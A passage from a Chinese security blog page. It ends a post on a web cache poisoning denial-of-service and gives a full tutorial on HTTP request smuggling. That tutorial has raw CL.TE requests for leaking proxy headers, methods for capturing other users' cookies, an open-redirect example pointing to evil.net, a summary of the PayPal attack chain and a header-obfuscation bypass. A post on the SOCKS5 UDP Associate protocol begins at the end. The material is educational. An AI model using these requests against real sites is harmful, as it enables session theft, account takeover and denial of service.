-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index?v&#x3D;test HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;test</span><br></pre></td></tr></table></figure>
-
-<p>再尝试发一个请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;test</span><br></pre></td></tr></table></figure>
-<p>我们可以看到，服务器将301缓存了起来，但是由于我们只能污染查询参数，所以在这看来并没有什么用处</p>
-<p>但是，仔细想想，你会发现实际上我们可以利用一个很少见的http状态码—414</p>
-<p>我们发送以下的请求，将url填充至最大字节，且假设响应被缓存</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index?v&#x3D;&lt;long-string&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt;</span><br></pre></td></tr></table></figure>
-
-<p>那么当有人访问index时，会得到如下响应</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt;</span><br></pre></td></tr></table></figure>
-
-<p>那么这时，你会发现在重定向时，301响应为我们补全了index后的/符号</p>
-<p>这就导致了如果受害者的浏览器收到这样的重定向响应后，由于本身url已经是最大值，而此时301响应多补了一个/，这就导致了url过长，使得任何一个用户访问index，都会得到一个HTTP 414响应</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 414 Request-URI Too Large</span><br><span class="line">CF-Cache-Status: MISS</span><br></pre></td></tr></table></figure>
-
-<p>这就造成了拒绝服务攻击，而且这仅仅需要一个请求</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没啥好说的，骚就完事了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/25/Web-Cache-Poisoning/" data-id="ckhx9966c000lar5y1lsxe7pt" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-HTTP-Smuggling" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/24/HTTP-Smuggling/" class="article-date">
-  <time datetime="2020-08-24T07:34:57.000Z" itemprop="datePublished">2020-08-24</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/24/HTTP-Smuggling/">HTTP Smuggling攻击</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实际上HTTP Smuggling已经不是一个很新的攻击技术，早在2005年，就已经有人提出过这一攻击方式，只是这一攻击方式普遍被认为过于复杂以及难以利用于实战，故而在被提出后并没有受到太多的重视</p>
-<p>然而，往往人们不看好的东西会有着巨大的财富</p>
-<p>借用albinowax的原话:</p>
-<p><strong>If a technique has a reputation for being difficult, fiddly, or dangerous, that’s a topic in dire need of further research. After repeatedly experiencing breakthroughs due to being pressured into exploring topics well outside my comfort zone, I’ve decided that the fastest route to novel findings is actively seeking out topics that make you uncomfortable. Chances are, these topics are avoided by other hackers, giving them serious research potential. To me, this is the only plausible explanation for why I was able to take a technique first documented in 2005, and presented again at DEF CON in 2016, and use it to earn $70k in bounties in 2019.</strong></p>
-<p>所以，好好研究，没有不好用的攻击技术，只有你不会玩的～</p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>HTTP偷渡(HTTP Smuggling)的原理可以简单用下面两张图来解释:</p>
-<p>首先是正常环境下的，用户访问一个带有反代服务器的网站:</p>
-<p><img src="/image/HTTP-Smuggling/normal-reverse-proxy.jpg" alt="normal"></p>
-<p>可以看到，由于HTTP / 1.1的兴起，反向代理服务器往往会将多个用户的请求通过单个的tcp链接串联在一起发送至后端服务器，实际上这一方法本身是无害的，只要前后端对于每一个消息的开始、结束位置达成一致，那么这一技术会大大减轻前后端服务器的负载，加快数据传输的效率。</p>
-<p>但是，这也成为了一个薄弱的环节，因为这就意味着前后端必须对每个消息的结束位置达成一致，如果无法达成一致，那么就有可能发生如下图的情况:</p>
-<p><img src="/image/HTTP-Smuggling/smuggling-reverse-proxy.jpg" alt="smuggling"></p>
-<p>也就是说攻击者可以构造畸形模糊的请求，使得后端服务器在处理攻击者的请求时只处理了“部分”恶意请求，而把“剩余”的恶意请求以及正常的用户请求视作同一个请求并进行处理，从而劫持用户的请求。</p>
-<p>这种攻击手法，就被称为HTTP偷渡(HTTP Smuggling)技术</p>
-<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>首先，现在的核心问题在于，我们应该如何构造一个所谓的<strong>畸形模糊的请求</strong>？</p>
-<p>这里就要引入一个我们大家都很熟知的概念—Transfer-Encoding</p>
-<p>相信大多数人知道这个概念都是因为我们可以利用Transfer-Encoding绕过waf，但是，实际上这一技术带来了许多神奇的攻击面，包括今天讨论的主角HTTP Smuggling</p>
-<p>我们大家都知道，一个HTTP POST请求当中往往会有一个Content-Length头，这个头标示了此POST请求所携带的数据的长度，而如果我们在一个HTTP请求当中同时添加两个Content-Length头，并且使用不同的值，绝大多数的服务器会直接拒绝这种格式的请求，认为此格式是非法的</p>
-<p>但是，参考RFC 2616规范，如果同时存在Content-Length以及Transfer-Encoding头，文档规定Content-Length头需要被忽略。故而我们可以得知一点：如果一个post请求当中同时携带Content-Length以及Transfer-Encoding头，那么这个请求是合法的，绝大多数的服务器并不会拒绝这样的请求</p>
-<p>那么问题就来了，如果两台服务器对这样的请求，一台服务器不支持Transfer-Encoding，另一台支持，那么，整个系统就不同步了，攻击者可以籍此触发HTTP Smuggling漏洞</p>
-<p>以下两张图可以帮助理解此问题:</p>
-<ul>
-<li>首先我假设前端服务器并不支持Transfer-Encoding，而后端服务器支持，在HTTP Smuggling中，我们往往将这一情况称为CL.​​TE</li>
-</ul>
-<p><img src="/image/HTTP-Smuggling/CL_TE.jpg" alt="CL.​​TE"></p>
-<p>在图中，我们可以看到，由于前端服务器不支持Transfer-Encoding，故而前端服务器只会转发蓝色的文本至后端服务器，而后端服务器由于一直无法收到以0结尾的Transfer-Encoding消息结束块，故而会一直等待，此链接就会超时。</p>
-<ul>
-<li>而如果前端服务器支持Transfer-Encoding，后端服务器不支持，那么在HTTP Smuggling中，这类情况被称为TE.CL</li>
-</ul>
-<p><img src="/image/HTTP-Smuggling/TE_CL.jpg" alt="TE.CL"></p>
-<p>在图中，可以看到由于前端服务器支持Transfer-Encoding，故而前端只会转发蓝色字体部分至后端服务器，而此时由于后端服务器需要读取6个字节长度的数据，需要等待最后一个X的到来，故而此时链接就会超时</p>
-<p>这两种方式都可以用来检测潜在的HTTP Smuggling风险</p>
-<p>那么也许有人会说，这不过就是让自己的链接超时罢了，没有什么大用，如果是这么想的话，看看下图如何？</p>
-<p><img src="/image/HTTP-Smuggling/basic_attack.jpg" alt="Attack"></p>
-<p>从图中可以看到，这是一个CL.​​TE类型的HTTP Smuggling攻击，前端服务器转发了包括蓝色及橙色消息在内的所有消息，而后端服务器在解析的过程中，只解析了蓝色字体部分，这就使得橙色消息被留在了缓冲区中，并与后来的一个受害者请求(绿色字体)合并，称为了一个新的HTTP请求</p>
-<p>也就是说，原本受害者希望向/search路径POST一个请求，但是由于HTTP Smuggling的存在，后端服务器在用户完全不知情的情况下，误认为受害者向/404发出了一个get请求，从而引发了受害者无法访问/search路径的问题。</p>
-<p>而这里的路径是完全可以自定义的，攻击者完全可以利用HTTP Smuggling漏洞迫使受害者加载恶意的外部js或者结合缓存漏洞形成拒绝服务攻击</p>
-<h2 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h2><p>上面我简单介绍了一些HTTP Smuggling的基础攻击手段及方式，接下来，我将更深入探讨HTTP Smuggling的更多用法</p>
-<h3 id="窃取“秘密的”HTTP标头"><a href="#窃取“秘密的”HTTP标头" class="headerlink" title="窃取“秘密的”HTTP标头"></a>窃取“秘密的”HTTP标头</h3><p>相信大家都知道，很多反向代理服务器会在代理HTTP请求至后端服务器的同时，附加一些HTTP头，比如我们所熟知的X-Real-IP等等</p>
-<p>这些标头里往往包含有一些比较敏感的信息，因为有些网站会将认证相关的信息附在HTTP头中</p>
-<p>HTTP Smuggling攻击将帮助我们获取这些敏感信息</p>
-<p>首先，我们需要一个存在漏洞的网站(在此例中是CL-TE)并找到一个能够反射出我们输入的参数的端点，比如我们常用的搜索框：</p>
-<p><img src="/image/HTTP-Smuggling/search.jpg" alt="search"></p>
-<p>可以看到，我搜索了“hello”后，上方的提示栏会将我们搜索的内容反射出来</p>
-<p>既然如此，我就可以构造如下的请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure>
-<p>由于CL-TE型漏洞的存在，故而前端将会转发所有的请求字符，但是，后端服务器在解析时，却仅解析了终止符，故而以下的字符被留在了缓冲区中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure>
-
-<p>当我将第一个请求再次发送时，在后端服务器看来，将会变成这个样子:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;helloPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Unknown-header:xxxxxxxxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
-
-<p>最终可以看见这样的返回:</p>
-<p><img src="/image/HTTP-Smuggling/search-smuggling.jpg" alt="search-smuggling"></p>
-<p>可以看到，后端服务器误把第二个POST请求当作了HTTP头，返回并暴露了敏感的头信息</p>
-<p>基于此信息，就有机会可以进一步利用内网的api等敏感基础设施</p>
-<h3 id="窃取身份验证信息"><a href="#窃取身份验证信息" class="headerlink" title="窃取身份验证信息"></a>窃取身份验证信息</h3><p>这个和上一个很像，基于同样的原理，我们可以窃取并保存用户的身份验证信息</p>
-<p>发送如下的请求：</p>
-<p><img src="/image/HTTP-Smuggling/cookie.jpg" alt="cookie"></p>
-<p>在此例中，服务器存在TE-CL漏洞，前端服务器将蓝色及橙色字体完整地转发给了后端服务器，而由于后端服务器不支持TE头，故而只能解析蓝色字体部分，橙色字体的部分便被留在了缓冲区中，等待受害者请求(绿色字体)到来时，橙色字体部分将和上一个例子一样，与绿色字体部分相结合，构成一个完整的HTTP请求，从而使得受害者本身的GET请求变为了一个更新个人信息的请求(这里的个人信息是攻击者的个人信息)</p>
-<p>攻击成功后如下:</p>
-<p><img src="/image/HTTP-Smuggling/cookie-smuggling.jpg" alt="cookie-smuggling"></p>
-<p>可以看见，受害者的HTTP头信息被保存在了攻击者的bio中，只需要调节橙色部分的CL长度，就可以将受害者的所有HTTP头全部窃取</p>
-<h3 id="Self-XSS"><a href="#Self-XSS" class="headerlink" title="Self-XSS"></a>Self-XSS</h3><p>相信大家在挖洞的过程中一定遇到过不少的self-xss，这类xss很难被利用，所以往往我们在遇到这类漏洞的时候，会选择直接忽略</p>
-<p>然而，若网站存在HTTP Smuggling漏洞，那么，Self-XSS也将成为威力巨大的武器</p>
-<p>如果一个网站存在HTTP Smuggling漏洞，且其SAML参数容易收到XSS攻击的影响，那么，发送如下的请求：</p>
-<p><img src="/image/HTTP-Smuggling/self-xss.jpg" alt="self-xss"></p>
-<p>解析过程如前两例所示，此时黑色字体将是受害者所获得的HTTP响应，已然被植入了XSS Payload</p>
-<p>借助HTTP Smuggling，Self-XSS也将成为不可忽视的漏洞点</p>
-<h3 id="Open-Redirecting"><a href="#Open-Redirecting" class="headerlink" title="Open-Redirecting"></a>Open-Redirecting</h3><p>同样的，由于我们可以实现Self-XSS，那么，在遇到一些基于DOM的开放重定向时，HTTP Smuggling也能发挥一波</p>
-<p>例如在redhat.com上有一个页面有如下的代码:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;assets&#x2F;idx?redir&#x3D;&#x2F;&#x2F;redhat.com@evil.net&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.redhat.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var destination &#x3D; getQueryParam(&#39;redir&#39;)</span><br><span class="line">[poor filtering]</span><br><span class="line">document.location &#x3D; destination</span><br></pre></td></tr></table></figure>
-
-<p>js尝试读取get请求中的redir的值并将网页重定向至其所指向的页面</p>
-<p>此时发送如下的请求：</p>
-<p><img src="/image/HTTP-Smuggling/open-redirect.jpg" alt="open-redirect"></p>
-<p>我们就可以劫持任意用户跳转至我们所希望的网页。</p>
-<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>许多网站会使用CDN技术，并且CDN的提供商也往往提供基于HOST标头，从一个网站访问同一CDN网络上的另一个网站的服务</p>
-<p>那么，我们可以对存在漏洞的网站发送如下的请求:</p>
-<p><img src="/image/HTTP-Smuggling/cdn.jpg" alt="cdn"></p>
-<p>这样我们就可以将原本访问redacted.com的受害者引导至<a target="_blank" rel="noopener" href="http://www.redhat.com网站">www.redhat.com网站</a></p>
-<p>更进一步说，我们完全可以使用户加载一个错误且非预期的资源</p>
-<p>SaaS提供商同样适用这一特性</p>
-<h3 id="“帮凶”-Apache和IIS"><a href="#“帮凶”-Apache和IIS" class="headerlink" title="“帮凶” Apache和IIS"></a>“帮凶” Apache和IIS</h3><p>相信大家应该都有注意到基于Apache以及IIS所搭建的网站都有一个这样的特性，就是当你访问一个不以反斜杠结尾的文件夹时，Apache和IIS都将会以HOST标头为基础重定向响应，以此来向文件夹末尾追加斜杠</p>
-<p>比如说这样一个请求:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure>
-
-<p>在发往由Apache以及IIS搭建的网站时，会收到如下的回复</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;example.com&#x2F;test&#x2F; </span><br></pre></td></tr></table></figure>
-
-<p>基于这个看来无害的特性，同时利用HTTP-Smuggling，我们可以使用如下的方式进行攻击:</p>
-<p><img src="/image/HTTP-Smuggling/apache-iis.jpg" alt="apache-iis"></p>
-<p>如图就可以将受害者的请求导向我们所指定的网站，另外，如果目标网站回复的是307的状态码，则可以更进一步，窃取用户POST的敏感数据</p>
-<p>因为307会使得POST请求重新发送至新的目标,但是需要用户的确认，RFC原文为: If the 307 status code is received in response to a request other than GET or HEAD, the user agent MUST NOT automatically redirect the request unless it can be confirmed by the user, since this might change the conditions under which the request was issued</p>
-<h3 id="缓存毒化"><a href="#缓存毒化" class="headerlink" title="缓存毒化"></a>缓存毒化</h3><p>缓存毒化是一个很有趣的话题，我会在之后的blog中详细讨论这个技术，现在，来瞅瞅这一技术如何与HTTP-Smuggling配合，实现惊人的效果</p>
-<p>例如我们向目标网站发出如下请求:</p>
-<p><img src="/image/HTTP-Smuggling/cache-posion.jpg" alt="cache-posion"></p>
-<p>受害者本身是访问/static/site.js的，然而却被我们劫持并访问了自己的账户信息，并且此时这个请求是携带受害者本身的cookie的</p>
-<p>如果此网站存在缓存漏洞，那么在后端服务器返回账户信息的同时，缓存会错误的认为，/static/site.js的响应是受害者/account/settings所返回的信息并将其缓存</p>
-<p>此时，作为攻击者，我们只需要访问/static/site.js这个静态文件，就可以获得受害者的账户信息:</p>
-<p><img src="/image/HTTP-Smuggling/account.jpg" alt="account"></p>
-<h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><p>接下来的攻击实例是基于albinowax大神对于paypal的攻击</p>
-<h3 id="发现请求走私漏洞"><a href="#发现请求走私漏洞" class="headerlink" title="发现请求走私漏洞"></a>发现请求走私漏洞</h3><p>首先攻击者发现了paypal登录页面上存在请求走私的漏洞，基于此，攻击者可以劫持几乎所有的paypal登陆界面所引用的js文件，如下:</p>
-<p><img src="/image/HTTP-Smuggling/paypal-smuggling.jpg" alt="paypal-smuggling"></p>
-<p>由于paypal使用了CDN，基于我之前介绍的基于CDN的攻击，攻击者可以籍此劫持受害者的js文件至外部网站的恶意js文件</p>
-<p>注意，这里location重定向指向了http网站，而paypal网站是https的，故而无法引入http资源，但是在Safari和IE上有特例,Safari拥有HSTS机制，如果这个转向的网站已经在safari的HSTS缓存中，那么http将自动升级为https；而IE则是可以完全绕过这一限制，在https中引入http资源</p>
-<p>所以本次攻击只对Safari和IE用户生效！</p>
-<h3 id="解决CSP"><a href="#解决CSP" class="headerlink" title="解决CSP"></a>解决CSP</h3><p>但是，由于paypal使用了CSP策略，故而劫持失败了</p>
-<p><img src="/image/HTTP-Smuggling/paypal-csp.jpg" alt="paypal-csp"></p>
-<p>攻击者继续寻找，发现了登陆界面有一个iframe加载了一个c.paypal.com上的子页面，并且此子页面没有使用CSP，同时导入了我们投毒的js文件，这时候攻击者就获得了iframe的完全控制权</p>
-<p><img src="/image/HTTP-Smuggling/paypal-iframe.jpg" alt="paypal-iframe"></p>
-<h3 id="解决同源策略"><a href="#解决同源策略" class="headerlink" title="解决同源策略"></a>解决同源策略</h3><p>但是，此时由于c.paypal.com与paypal.com不同源，同源策略限制了对paypal.com的DOM树的访问</p>
-<p>故而，攻击者进一步查找，终于在paypal.com/us/gifts上找到了一个不使用CSP，且导入了投毒后的js文件的网页，而因为攻击者已经完全控制了iframe，故而攻击者可以将此iframe重定向至paypal.com/us/gifts并第三次触发投毒后的js文件导入，从而籍被污染的js文件来操作paypal.com/signin的界面，获取明文的用户名密码。</p>
-<p><img src="/image/HTTP-Smuggling/paypal-success.jpg" alt="paypal-success"></p>
-<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>paypal修复了这个漏洞，通过将akamai配置为拒绝<code>Transfer-Encoding: chunked</code>来修复此问题</p>
-<p>但是albinowax随后发现，如果将TE头修改成下面这种形式，将可以绕过paypal的缓解措施:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:</span><br><span class="line">chunked</span><br></pre></td></tr></table></figure>
-
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过学习albinowax大神的文章以及相关的知识，又掌握了一个小小的黑科技hh，其实没有什么没用的漏洞，完全是看利用者的水平，菜刀在高手的手里，也会变成精巧无比的手术刀。</p>
-<p>另外，立个flag，速速把缓存毒化的blog也搞出来hh</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/24/HTTP-Smuggling/" data-id="ckhx9966y001par5y8a3x8bjm" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Socks5-UDP" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/24/Socks5-UDP/" class="article-date">
-  <time datetime="2020-08-24T06:13:27.000Z" itemprop="datePublished">2020-08-24</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/24/Socks5-UDP/">Socks5中UDP Associate特性实现与trick</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="RFC文档"><a href="#RFC文档" class="headerlink" title="RFC文档"></a>RFC文档</h2><p>首先要实现这个特性，那么必不可少的，需要去查看这个定义此特性的<a target="_blank" rel="noopener" href="https://www.ietf.org/rfc/rfc1928.txt">RFC1928</a></p>
-<p>这里要吐槽一下，由于此RFC文档又使用了传统艺能 – xxx MAY xxx，所以文档对于此功能的描述是模糊的，很多相关问题并没有详细的说明，所以可能各人的实现方法也会有些许的不同，但是大体上还是有一个共识，不会过分影响其核心的功能</p>
-<p>通过阅读此RFC，可以得出主要的几个要点：</p>
-<ul>
-<li>UDP Associate中的每一个UDP Listener生存周期必须与其最初协商时所使用的tcp链接相关，即一个UDP Associate请求最终会对应一条tcp链接和一个UDP Listener，当tcp链接断开时，UDP Listener也将会退出，反之亦然</li>
-<li>在udp客户端发出的UDP Associate请求中应当带上自己期望发送数据的源端口及源地址，而socks5服务器可以选择是否基于此来对数据来源进行限制(RFC原文：The UDP ASSOCIATE request is used to establish an association within the UDP relay process to handle UDP datagrams. The DST.ADDR and DST.PORT fields contain the address and port that the client expects to use to send UDP datagrams on for the association.  The server MAY use this information to limit access to the association.  If the client is not in possesion of the information at the time of the UDP ASSOCIATE, the client MUST use a port number and address of all zeros.)  </li>
-<li>UDP Associate中的所有udp请求都应当带上一个标准的包头，标示此udp包的目的地(供socks5 server解析)以及标示此包的响应者(供UDP Client解析)</li>
-<li>socks5服务器可以选择不处理分片的udp请求，UDP Client应当自己负责重传丢包的问题</li>
-<li>UDP Associate的协商是在最初的TCP连接上实现的，即要用UDP Associate，必须先像TCP Connect一样先打开一个tcp链接来与socks5服务器通讯，完成相关协商后，再打开UDP通讯信道进行实际的UDP包relay</li>
-</ul>
-<p>在以上的几个要点中，第二点有个问题就是很多支持socks5代理的udp客户端并没有严格执行这一标准，在UDP Associate请求包里携带的仍然是目标ip及port，为了保持对这种客户端的兼容，我在具体实现的过程中以第一个向协商后的udp端口发送数据的源ip+port作为标准(因为一般在UDP Associate后，客户端会在极短的时间内向协商好的端口发送数据)，放弃了以UDP Associate包作为标准的尝试。</p>
-<p>另外，虽然RFC文档中没有说明是否一个UDP Associate链接应当只对应一个目的IP+port，但是基于其第三条要点，推测其大概率允许一个UDP Associate所创建的listener对应多个目的IP+port，只要在标准的包头中定义好此包的目的IP+port即可</p>
-<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>由于网上开源的socks5服务器99%都是单独的服务器，不会涉及多跳的问题，故而我的工具实现起来会较复杂一些</p>
